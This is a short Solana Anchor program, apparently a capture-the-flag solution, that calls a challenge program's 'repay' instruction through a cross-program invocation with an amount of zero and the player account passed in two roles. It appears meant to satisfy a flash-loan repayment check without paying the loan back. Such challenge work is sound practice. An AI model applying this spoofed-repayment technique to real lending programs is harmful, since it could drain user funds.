use anchor_lang::prelude::*;

use anchor_spl::token::{ TokenAccount, Token };

use challenge3::{self, Pool, State};
use challenge3::cpi::accounts::Repay;
use challenge3::program::Challenge3;

declare_id!("3dxs6HNWYRGW3LTQygqJaJDYhbGEfA8NR1HKEbpi6rZ6");


#[program]
pub mod caller {
    use super::*;

    pub fn call_repay(ctx: Context<RepayStuff>) -> Result<()> {
        msg!("Calling the repay from other program");
        
        let cpi_program = ctx.accounts.chall3.to_account_info();
        let cpi_accounts = Repay {
            player: ctx.accounts.player.to_account_info(),
            user: ctx.accounts.player.to_account_info(),
            state: ctx.accounts.state.to_account_info(),
            pool: ctx.accounts.pool.to_account_info(),
            pool_account: ctx.accounts.pool_account.to_account_info(),
            depositor_account: ctx.accounts.depositor_account.to_account_info(),
            token_program: ctx.accounts.token_program.to_account_info()
        };
        let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);
        msg!("making cpi");
        challenge3::cpi::repay(cpi_ctx, 0);
        msg!("cpi done");
        Ok(())

    }
}

#[derive(Accounts)]
pub struct RepayStuff<'info>{
    pub chall3: Program<'info, Challenge3>,
    /// CHECK: shut up
    pub player: AccountInfo<'info>,
    pub user: Signer<'info>,
    pub state: Account<'info, State>,
    pub pool: Account<'info, Pool>,
    pub pool_account: Account<'info, TokenAccount>,
    pub depositor_account: Account<'info, TokenAccount>,
    pub token_program: Program<'info, Token>,
}
